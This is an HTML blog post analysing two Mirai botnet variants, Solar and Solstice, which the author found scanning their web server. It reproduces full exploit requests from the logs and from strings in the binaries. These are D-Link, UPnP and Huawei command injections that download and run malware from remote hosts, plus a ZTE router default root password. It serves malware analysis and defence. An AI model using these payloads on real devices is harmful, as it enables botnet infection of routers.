@@ -1,0 +1,303 @@
+<!doctype html>
+
+<html lang="en-us">
+
+<head>
+  <title>Race Conditions</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="description" content="The HTML5 Herald" />
+  <meta name="author" content="Camilla Montonen" />
+  <meta name="generator" content="Hugo 0.37.1" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/7.0.0/normalize.min.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Slab|Ruda" />
+  <link rel="stylesheet" type="text/css" href="/css/styles.css" />
+</head>
+
+<body>
+  <div id="container">
+    <header>
+      <h1>
+                <a href="/">Race Conditions</a>
+            </h1>
+
+      <ul id="social-media">
+          
+        <li><a href="https://github.com/https://github.com/winterflower"><i class="fa fa-github fa-lg" aria-hidden="true"></i></a></li>
+           
+      </ul>
+      
+      <p><em>One commit at a time</em></p>
+      
+    </header>
+
+    
+<nav>
+    <ul>
+        
+    </ul>
+</nav>
+
+    <main>
+
+
+
+
+<article>
+
+    <h1>Solar and Solstice - Two Mirai Variants</h1>
+
+    
+        <aside>
+    <ul>
+        <li>
+            <time class="post-date" datetime="2019-04-22T16:18:52&#43;02:00">Apr 22, 2019</time>
+        </li>
+        
+        
+
+        
+
+        <li>7 min read</li>
+    </ul>
+</aside>
+    
+
+    
+
+<p><em>Notes on Solar and Solstice binaries.</em></p>
+
+<h3 id="strange-visitors-in-the-access-logs">Strange Visitors in the Access Logs</h3>
+
+<p>A few days (or maybe it was weeks), after I launched a public facing web service (a visual colour search engine
+I wrote a bit more about <a href="https://blog.race-conditions.net/posts/building-a-visual-lipcolour-search-engine/">in this post</a>)
+I started seeing some strange entries in the access logs.</p>
+
+<pre><code>&quot;&lt;source ip redacted&gt; - - [20/Apr/2019:14:11:03 +0000] &quot;GET
+/login.cgi?cli=aa%20aa%27;
+wget%20http://&lt;compromised host redacted&gt;/bins/Rep.mips%20-O%20-&gt;%20/tmp/.Solar;
+chmod%20777%20/tmp/.Solar;/tmp/.Solar%20Dlink.mips%27$
+HTTP/1.1&quot; 404 233 &quot;-&quot; &quot;Solar/9.0&quot;
+&quot;  
+</code></pre>
+
+<p>They came with various funny looking user agent strings like Hakai, Shinka, LMAO and trapgod.
+These requests are passively scanning available IP addresses and looking for D-Link routers, which have not
+been patched for a remote command execution vulnerability (described <a href="https://www.exploit-db.com/exploits/44760">here</a>).
+By sending a request to the /login.cgi endpoint and including the <code>cli</code> parameter, attackers are able to trick the compromised
+D-Link router to download a binary (for example <code>Rep.mips</code> in the example above), store it in the /tmp folder, turn it
+into an executable and then run it.</p>
+
+<p>Although after a few months, most of the scanning activity for Hakai, Shinka, LMAO and trapogod stopped,
+two variants: Solar and Solstice keep rearing their heads every now and then. After a few quiet weeks in the access logs,
+I detected a new scan attempting to download Solar and another similar one attempting to download Solstice.</p>
+
+<pre><code>&lt;redacted source&gt; - - [21/Apr/2019:15:19:20 +0000]
+&quot;GET /login.cgi?cli=aa%20aa%27;wget%20http://&lt;host machine&gt;/bins/Solstice.mips%20-O%20-&gt;%20/tmp/.Solstice;
+chmod%20777%20/tmp/.Solstice;
+/tmp/.Solstice%20dlink%27$ HTTP/1.1&quot; 404 233 &quot;-&quot; &quot;Solstice/2.0&quot;
+</code></pre>
+
+<p>According to AbusedIP, the source IP which originated this request for Solstice belongs to an Italian telecommunications company. Most likely at some point the machine was compromised and this scanner program installed. The compromised hosting server which is the target of the <code>wget</code> command belongs to a hosting provider located in the United States.</p>
+
+<p>As of this writing, neither of the hosting machines is online, which means someone has noticed and fixed the problem hopefully!
+In the remainder of this post, I&rsquo;m going to examine malware binaries, which spread with the same exploit and under the same user agents. It&rsquo;s possible that the binaries distributed with the aforementioned scanning activity have changed. In particular, it seems likely that the binary for Solar.mips may have changed. Previous commands did not include the filename <code>Rep.mips</code>, but this could be just a simple file renaming exercise.</p>
+
+<h3 id="taking-a-look-at-the-binaries">Taking a look at the binaries</h3>
+
+<h4 id="md5-hashes">MD5 Hashes</h4>
+
+<p>7bfd3737bc3bb8e1439cc65d61fab59b  Solstice <a href="https://www.virustotal.com/#/file/76fa272abf24e2384d2ba7b8ddd1c3b99b3111e167bf12eb58339b04b8ec5674/detection">link to VirusTotal</a></p>
+
+<p>49521f4745ef08731bbb0c1771113a3f  Solar.mips <a href="https://www.virustotal.com/#/file/0ae1e7fe4fadbc0aceabed960300985617848c6d5e8ceecdeaa462ec87cf795a/detection">link to VirusTotal</a></p>
+
+<p>Both the Solar and Solstice binaries are 32-bit MSB executables.
+You can find this out by running the <code>file</code> command.</p>
+
+<pre><code>file Solar.mips
+Solar.mips: ELF 32-bit MSB executable, MIPS, MIPS-I version 1 (SYSV), statically linked, stripped
+</code></pre>
+
+<p>Let&rsquo;s unpack this a little bit. ELF stands of Executable and Linkable Format and is a common format you might find on *nix like systems. The MIPS part refers to the target instruction architecture that the file is compiled for.
+For example, if I run the <code>file</code> command on the <code>python3.5</code> binary, I&rsquo;ll get the following output</p>
+
+<pre><code>python3.5: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32,
+</code></pre>
+
+<p>which tells me that the target architecture for this ELF binary is x86-64.</p>
+
+<p>MIPS, short for <a href="https://en.wikipedia.org/wiki/MIPS_architecture">Microprocessor without Interlocked Pipeline Stages</a>, is a reduced instruction set. MIPS architectures are commonly found in embedded systems and routers, which makes sense, because routers are targets for Mirai variants.</p>
+
+<p>Now that we&rsquo;ve established the types of files we are dealing with, let&rsquo;s take a look at the strings in each of these ELF files.</p>
+
+<h4 id="solstice-strings">Solstice strings</h4>
+
+<p>Let&rsquo;s take a look at the first interesting output from <code>strings Solstice</code>.</p>
+
+<pre><code>POST /UD/?9 HTTP/1.1
+User-Agent: OSIRIS
+Content-Type: text/xml
+SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping
+&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;s:Body&gt;&lt;u:AddPortMapping xmlns:u=&quot;urn:schemas-upnp-org:service:WANIPConnection:1&quot;&gt;&lt;NewRemoteHost&gt;&lt;/NewRemoteHost&gt;&lt;NewExternalPort&gt;47449&lt;/NewExternalPort&gt;&lt;NewProtocol&gt;TCP&lt;/NewProtocol&gt;&lt;NewInternalPort&gt;44382&lt;/NewInternalPort&gt;&lt;NewInternalClient&gt;`&gt;/tmp/.e &amp;&amp; cd /tmp; &gt;/var/dev/.e &amp;&amp; cd /var/dev; wget http://1.1.1.1/Solar.sh -O - &gt; lol.sh; chmod 777 lol.sh; sh lol.sh; rm lol.sh; iptables -A INPUT -p tcp --destination-port 5555 -j DROP`&lt;/NewInternalClient&gt;&lt;NewEnabled&gt;1&lt;/NewEnabled&gt;&lt;NewPortMappingDescription&gt;syncthing&lt;/NewPortMappingDescription&gt;&lt;NewLeaseDuration&gt;0&lt;/NewLeaseDuration&gt;&lt;/u:AddPortMapping&gt;&lt;/s:Body&gt;&lt;/s:Envelope&gt;
+</code></pre>
+
+<p>After a quick Google search, it looks like the Solstice binary might be using some variation of the <a href="https://www.exploit-db.com/exploits/27044">UPnP SOAP Command Execution</a> to embed a shell command in the <code>&lt;NewInternalClient&gt;&lt;/NewInternalClient&gt;</code> block. I&rsquo;m trying to read the command</p>
+
+<pre><code>`&gt;/tmp/.e &amp;&amp; cd /tmp; &gt;/var/dev/.e &amp;&amp; cd /var/dev; wget http://1.1.1.1/Solar.sh -O - &gt; lol.sh; chmod 777 lol.sh; sh lol.sh; rm lol.sh; iptables -A INPUT -p tcp --destination-port 5555 -j DROP`
+</code></pre>
+
+<p>as though it was regular bash. Some parts are clear, others not so much.
+For example, it looks like we are redirecting something to a file <code>/tmp/.e</code> and then changing directories to <code>/tmp</code>, but it&rsquo;s not clear exactly what is being redirected to <code>/tmp.e</code> or if the symbol <code>&gt;</code> even means redirection here. Afterwards, we change directories to <code>/var/dev</code> and try to download a shell script <code>Solar.sh</code> from <code>1.1.1.1</code>, which funnily enough, <a href="https://en.wikipedia.org/wiki/1.1.1.1">looks like the DNS system that Cloudflare set up a while ago</a>.</p>
+
+<p>If you read the Wikipedia article, you&rsquo;ll notice that this address is not a reserved IP address, and to quote the article, &ldquo;and was abused by many existing routers (mostly those sold by Cisco Systems) and companies for hosting login pages to private networks, exit pages or other purposes, rendering the proper routing of 1.1.1.1 impossible on those systems&rdquo;. So based on this, it looks like the command embedded in this SOAPaction request is trying to download a shell script called <code>Solar.sh</code> from some sort of internal system. Weird.</p>
+
+<p>Another weird thing is that the binary is named Solstice, but it appears to download something that could be (if the malware author is keeping with their naming theme) part of the Solar variant&rsquo;s spreading strategy. Maybe Solstice was just a slightly tweaked copy of Solar?</p>
+
+<p>The command then continues to run make the script (now renamed to <code>lol.sh</code>) executable, runs it once, removes it and modifies firewall rules (the <code>iptables</code> command).</p>
+
+<p>The second interesting string looks like this</p>
+
+<pre><code>POST /cdn-cgi/
+Cookie: 
+http
+url=
+</code></pre>
+
+<p>Based on <a href="https://github.com/Neo23x0/signature-base/blob/master/yara/crime_mirai.yar">this YARA signature</a> by Florian Roth, this string appears to be a vestige of the original Mirai source code. Not much more to add to this at this point.</p>
+
+<pre><code>GET /login.cgi?cli=aa%20aa%27;wget%20http://&lt;redacted IP&gt;/bins/Solstice.mips%20-O%20-&gt;%20/tmp/.Solstice;chmod%20777%20/tmp/.Solstice;/tmp/.Solstice%20dlink%27$ HTTP/1.1
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: Solstice/2.0
+</code></pre>
+
+<p>This HTTP request is similar to the original request I detected in my access logs. Presumably this is one of the ways every new Solstic infection spreads.</p>
+
+<p>The final request we can find among the strings from the Solstice binary is this one</p>
+
+<pre><code>POST /ctrlt/DeviceUpgrade_1 HTTP/1.1
+Content-Length: 430
+Connection: keep-alive
+Accept: */*
+Authorization: Digest username=&quot;dslf-config&quot;, realm=&quot;HuaweiHomeGateway&quot;, nonce=&quot;88645cefb1f9ede0e336e3569d75ee30&quot;, uri=&quot;/ctrlt/DeviceUpgrade_1&quot;, response=&quot;3612f843a42db38f48f59d2a3597e19c&quot;, algorithm=&quot;MD5&quot;, qop=&quot;auth&quot;, nc=00000001, cnonce=&quot;248d1a2560100669&quot;
+&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;s:Body&gt;&lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;&lt;NewStatusURL&gt;$(/bin/busybox wget -g 68.183.170.67 -l /tmp/rex -r /bins/Solstice.mips; /bin/busybox chmod 777 * /tmp/rex; /tmp/rex huawei)&lt;/NewStatusURL&gt;&lt;NewDownloadURL&gt;$(echo HUAWEIUPNP)&lt;/NewDownloadURL&gt;&lt;/u:Upgrade&gt;&lt;/s:Body&gt;&lt;/s:Envelope&gt;
+</code></pre>
+
+<p>As Security Affairs writes in <a href="https://securityaffairs.co/wordpress/67040/malware/satori-botnet-mirai-variant.html">this article about the rise of the Satori variant of the Mirai family</a>, this request exploits the vulnerability CVE-2017-17215, which allows attackers to inject shell commands into the request.</p>
+
+<pre><code>&lt;NewStatusURL&gt;$(/bin/busybox wget -g &lt;redacted IP&gt; -l /tmp/rex -r /bins/Solstice.mips; /bin/busybox chmod 777 * /tmp/rex; /tmp/rex huawei)&lt;/NewStatusURL&gt;
+</code></pre>
+
+<p>As in previous examples, the injected command downloads a binary from an IP address, makes the binary executable  and runs it. I tried to look though the <code>wget</code> manual to find out what the <code>-g</code> flag would do, but alas, no luck.</p>
+
+<p>Finally, two interesting strings</p>
+
+<pre><code>Solstice.com
+abcdefghijklmnopqrstuvw012345678
+</code></pre>
+
+<p>The first one appears to be a registered domain, the second one a string of letters and numbers - presumably for some kind of algorithm to generate passwords(?).</p>
+
+<h4 id="solar-strings">Solar strings</h4>
+
+<p>The strings present in the Solar binary are similar.</p>
+
+<p>The same Mirai source code vestige we saw for Solstice</p>
+
+<pre><code>POST /cdn-cgi/
+Cookie: 
+http
+url=
+</code></pre>
+
+<p>The familiar request to the <code>login.cgi</code> endpoint (similar to the one for Solstice).</p>
+
+<pre><code>GET /login.cgi?cli=aa%20aa%27;wget%20http://&lt;IP redacted&gt;/bins/Solar.mips%20-O%20-&gt;%20/tmp/.Solar;chmod%20777%20/tmp/.Solar;/tmp/.Solar%20dlink%27$ HTTP/1.1
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: Solar/2.0
+</code></pre>
+
+<p>and another familiar one</p>
+
+<pre><code>POST /ctrlt/DeviceUpgrade_1 HTTP/1.1
+Content-Length: 430
+Connection: keep-alive
+Accept: */*
+Authorization: Digest username=&quot;dslf-config&quot;, realm=&quot;HuaweiHomeGateway&quot;, nonce=&quot;88645cefb1f9ede0e336e3569d75ee30&quot;, uri=&quot;/ctrlt/DeviceUpgrade_1&quot;, response=&quot;3612f843a42db38f48f59d2a3597e19c&quot;, algorithm=&quot;MD5&quot;, qop=&quot;auth&quot;, nc=00000001, cnonce=&quot;248d1a2560100669&quot;
+&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;s:Body&gt;&lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;&lt;NewStatusURL&gt;$(/bin/busybox wget -g &lt;IP redacted&gt; -l /tmp/rex -r /bins/Solar.mips; /bin/busybox chmod 777 * /tmp/rex; /tmp/rex huawei)&lt;/NewStatusURL&gt;&lt;NewDownloadURL&gt;$(echo HUAWEIUPNP)&lt;/NewDownloadURL&gt;&lt;/u:Upgrade&gt;&lt;/s:Body&gt;&lt;/s:Envelope&gt;
+</code></pre>
+
+<p>In addition, the Solar binary, just like Solstice, has a domain name</p>
+
+<pre><code>Solarpanels.com
+</code></pre>
+
+<p>and the same string of letters in the alphabet and numbers</p>
+
+<pre><code>abcdefghijklmnopqrstuvw012345678
+</code></pre>
+
+<p>The request below appears in a repository of [ZTexploits(<a href="https://github.com/stasinopoulos/ZTExploit/blob/master/ZTExploit_Source/ztexploit.py">https://github.com/stasinopoulos/ZTExploit/blob/master/ZTExploit_Source/ztexploit.py</a>)</p>
+
+<pre><code>POST /login.gch HTTP/1.1
+User-Agent: L33T &lt;3
+Content-Length: 420
+Connection: keep-alive
+Accept: */*
+</code></pre>
+
+<p>Likewise, this fragment</p>
+
+<pre><code>Frm_Logintoken=4&amp;Username=root&amp;Password=W%21n0%26oO7.
+</code></pre>
+
+<p>references the default username and password in the <code>ZTE ZXV10 H108L Router</code> remote command execution exploitt.</p>
+
+<p>The last HTTP method string present is a POST method that <a href="https://www.exploit-db.com/exploits/36978">allows attackers to download a configuration file without authentication</a></p>
+
+<pre><code>POST /getpage.gch?pid=1001&amp;logout=1 HTTP/1.1
+User-Agent: L33T &lt;3
+Content-Length: 420
+Connection: keep-alive
+Accept: */*
+</code></pre>
+
+
+</article>
+
+
+<section class="post-nav">
+    <ul>
+        
+        <li>
+            <a href="http://blog.race-conditions.net/posts/building-a-visual-lipcolour-search-engine/"><i class="fa fa-chevron-circle-left"></i> Building a Visual Lipcolour Search Engine</a>
+        </li>
+        
+        
+        <li>
+            <a href="http://blog.race-conditions.net/posts/team-antipatterns-conflicting-priorities/">Team Antipatterns: Conflicting Priorities <i class="fa fa-chevron-circle-right"></i> </a>
+        </li>
+        
+    </ul>
+</section>
+    
+
+
+
+
+
+</main>
+    <footer>
+        <h6>Copyright &copy; 2018 - Camilla Montonen | 
+            Rendered by <a href="https://gohugo.io" title="Hugo">Hugo</a> |
+            <a href="http://blog.race-conditions.net/index.xml">Subscribe</a></h6>
+    </footer>
+</div>
+<script src="/js/scripts.js"></script>
+</body>
+
+</html>
